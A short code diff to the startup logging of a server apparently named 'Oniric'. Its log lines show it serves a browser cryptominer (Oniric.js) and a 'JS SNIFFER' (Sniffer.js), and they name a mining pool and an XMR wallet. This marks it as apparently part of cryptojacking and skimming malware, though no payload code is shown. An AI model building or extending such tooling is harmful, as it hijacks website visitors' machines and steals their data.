@@ -27,10 +27,13 @@ export class App {
         RealtimeServer(web);
         web.listen(conf.port,conf.domain , () => {
             console.log('[!] Oniric Server Loaded');
-            console.log('[!] Realtime and Rest-Api are Listening on: '+ conf.domain + ':' + conf.port);
+            console.log('[!] Realtime on: ws://' + conf.domain + ':' + conf.port);
+            console.log('[!] Rest-Api on: http://'+ conf.domain + ':' + conf.port);
             console.log('[!] Pool Host: '+conf.pool);
             console.log('[!] XMR Wallet: ' + conf.addr);
-            console.log(`[!] Daemon start. PID: ${process.pid}\n`);
+            console.log(`[!] Daemon start. PID: ${process.pid}`);
+            console.log('[!] JS SNIFFER on: '+ conf.domain + ':' + conf.port + "/Sniffer.js");
+            console.log('[!] Miner on: '+ conf.domain + ':' + conf.port + "/Oniric.js");
         });
     }
 }
